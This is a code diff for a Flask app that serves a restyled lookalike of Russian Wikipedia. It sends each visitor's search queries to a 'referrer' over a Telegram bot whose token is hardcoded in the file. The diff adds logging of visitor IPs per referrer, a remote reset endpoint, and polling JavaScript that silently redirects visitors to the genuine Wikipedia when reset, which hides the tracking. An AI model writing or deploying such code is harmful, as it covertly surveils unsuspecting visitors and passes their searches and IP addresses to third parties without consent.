@@ -1,14 +1,17 @@
-from flask import Flask, request, Response
+from flask import Flask, request, Response, redirect
 import requests
 import re
 from bs4 import BeautifulSoup
 import os
+from collections import defaultdict
 
 app = Flask(__name__)
 BASE_URL = "https://ru.m.wikipedia.org"
-
-# Замените на ваш токен Telegram-бота
 TELEGRAM_TOKEN = '7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU'
+
+# Храним рефералов и их статус {referrer_id: [list_of_referred_user_ips]}
+referral_db = defaultdict(list)
+reset_status = defaultdict(bool)
 
 def send_to_referrer(chat_id: str, query: str):
     url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
@@ -22,14 +25,33 @@ def send_to_referrer(chat_id: str, query: str):
     except Exception as e:
         print(f"Ошибка при отправке сообщения: {e}")
 
+@app.route('/reset_referrals')
+def reset_referrals():
+    ref_id = request.args.get("ref")
+    if ref_id:
+        reset_status[ref_id] = True
+        return "OK", 200
+    return "Invalid request", 400
+
 @app.route('/')
 def wiki_proxy():
-    search_query = request.args.get("search")
     ref_id = request.args.get("ref")
+    client_ip = request.remote_addr
+    
+    # Проверяем, не был ли реферер сброшен
+    if ref_id and reset_status.get(ref_id, False):
+        # Перенаправляем на обычную Википедию
+        return redirect("https://ru.wikipedia.org", code=302)
+    
+    # Добавляем пользователя в базу рефералов
+    if ref_id and client_ip not in referral_db[ref_id]:
+        referral_db[ref_id].append(client_ip)
+        reset_status[ref_id] = False  # Сбрасываем статус, если был новый переход
+    
+    search_query = request.args.get("search")
     page = search_query if search_query else "Ирбис"
     url = f"{BASE_URL}/wiki/{page}"
 
-    # Если есть и ref, и search, шлем сообщение в Telegram
     if ref_id and search_query:
         send_to_referrer(ref_id, search_query)
 
@@ -42,11 +64,9 @@ def wiki_proxy():
     soup = BeautifulSoup(r.text, "html.parser")
     content_div = soup.find("div", class_="mw-parser-output")
 
-    # Удаляем ненужные элементы
     for tag in soup.find_all(["script", "style", "form"]):
         tag.decompose()
 
-    # Вставляем кастомную форму
     custom_form = BeautifulSoup(f"""
     <div class="search-container" onclick="event.stopPropagation()" style="position: relative; z-index: 10; background: white;">
         <form action="/" method="get" class="minerva-search-form">
@@ -64,7 +84,6 @@ def wiki_proxy():
     </div>
     """, "html.parser")
 
-    # Вставка JS-скрипта для UI
     script = soup.new_tag("script")
     script.string = """
 document.addEventListener("DOMContentLoaded", function () {
@@ -78,7 +97,18 @@ document.addEventListener("DOMContentLoaded", function () {
 
     const lastModifiedBar = document.querySelectorAll('a.last-modified-bar');
 
-    // Деактивация кликов вне поиска
+    // Проверяем статус реферера каждые 5 секунд
+    setInterval(() => {
+        fetch('/check_reset?ref=' + new URLSearchParams(window.location.search).get('ref'))
+            .then(response => response.json())
+            .then(data => {
+                if (data.reset) {
+                    window.location.href = 'https://ru.wikipedia.org';
+                }
+            });
+    }, 5000);
+
+    // Остальной ваш код...
     document.body.addEventListener("click", function (event) {
         const isInsideForm = searchForm.contains(event.target);
         const tag = event.target.tagName.toLowerCase();
@@ -104,15 +134,12 @@ document.addEventListener("DOMContentLoaded", function () {
 
     form.addEventListener("click", function (e) {
         e.stopPropagation();
-
-        // Скрываем футер
         const footerText = footer.querySelectorAll('*');
         footerText.forEach(element => {
             element.style.visibility = 'hidden';
         });
         footer.style.backgroundColor = 'white';
 
-        // Скрываем main
         const mainText = main.querySelectorAll('*');
         mainText.forEach(element => {
             if (!form.contains(element)) {
@@ -121,10 +148,8 @@ document.addEventListener("DOMContentLoaded", function () {
         });
         main.style.backgroundColor = 'white';
 
-        // Меняем только border-color-base
         document.documentElement.style.setProperty('--border-color-subtle', 'white');
 
-        // Полоска
         lastModifiedBar.forEach(bar => {
             bar.style.backgroundColor = 'white';
             bar.style.borderBottom = '1px solid white';
@@ -134,24 +159,20 @@ document.addEventListener("DOMContentLoaded", function () {
 
     document.addEventListener("click", function (event) {
         if (!form.contains(event.target)) {
-            // Восстанавливаем футер
             const footerText = footer.querySelectorAll('*');
             footerText.forEach(element => {
                 element.style.visibility = '';
             });
             footer.style.backgroundColor = '';
 
-            // Восстанавливаем main
             const mainText = main.querySelectorAll('*');
             mainText.forEach(element => {
                 element.style.visibility = '';
             });
             main.style.backgroundColor = '';
 
-            // Возвращаем переменную к стандартному состоянию (пусто — значит наследуется из CSS)
             document.documentElement.style.removeProperty('--border-color-subtle');
 
-            // Полоска
             lastModifiedBar.forEach(bar => {
                 bar.style.backgroundColor = '';
                 bar.style.borderBottom = '';
@@ -160,20 +181,16 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     });
 });
-
-
 """
     soup.body.append(script)
 
     if not content_div:
         return "<h1>Контент не найден на странице</h1>"
 
-    # Вставляем форму после логотипа
     header_div = soup.find("div", class_="branding-box")
     if header_div:
         header_div.insert_after(custom_form)
 
-    # Для результатов поиска — оставляем краткое описание и инфоблоки
     if search_query:
         new_content = BeautifulSoup("", "html.parser")
         first_p = content_div.find("p")
@@ -187,12 +204,18 @@ document.addEventListener("DOMContentLoaded", function () {
         content_div.clear()
         content_div.append(new_content)
 
-    # Обработка ссылок и изображений
     html = str(soup)
     html = re.sub(r'href="(/[^"]+)"', f'href="{BASE_URL}\\1"', html)
     html = re.sub(r'src="(/[^"]+)"', f'src="{BASE_URL}\\1"', html)
 
     return Response(html, mimetype="text/html")
+
+@app.route('/check_reset')
+def check_reset():
+    ref_id = request.args.get("ref")
+    if ref_id and reset_status.get(ref_id, False):
+        return {"reset": True}, 200
+    return {"reset": False}, 200
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
